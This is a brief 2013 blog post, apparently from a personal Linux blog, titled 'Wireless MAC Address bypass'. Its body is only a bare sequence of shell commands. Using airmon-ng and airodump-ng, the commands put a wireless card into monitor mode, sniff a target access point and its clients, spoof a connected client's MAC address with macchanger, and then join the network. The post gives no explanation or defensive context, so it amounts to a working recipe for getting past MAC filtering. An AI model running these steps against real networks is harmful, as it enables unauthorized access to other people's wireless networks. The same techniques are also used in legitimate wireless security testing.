---
_edit_last: "1"
Hide OgTags: "0"
Hide SexyBookmarks: "0"
author: thomasf
categories:
  - linux
date: "2013-05-22T21:23:15+00:00"
guid: https://blog.wapnet.nl/?p=1054
parent_post_id: null
post_id: "1054"
title: Wireless MAC Address bypass
url: /2013/05/wireless-mac-address-bypass/

---
airmon-ng start wlan0
airodump-ng mon0
iwconfig wlan0 essid SSID-NAME channel X
iwconfig wlan0
airodump-ng -c 4 -a --bssid MACADDRESS-AP mon0
airmon-ng stop wlan0
macchanger -m MACADDRESS-CLIENT wlan0
ifconfig wlan0 down
ifconfig wlan0 up
iwconfig wlan0 essid SSID-NAME channel 4
iwconfig wlan0
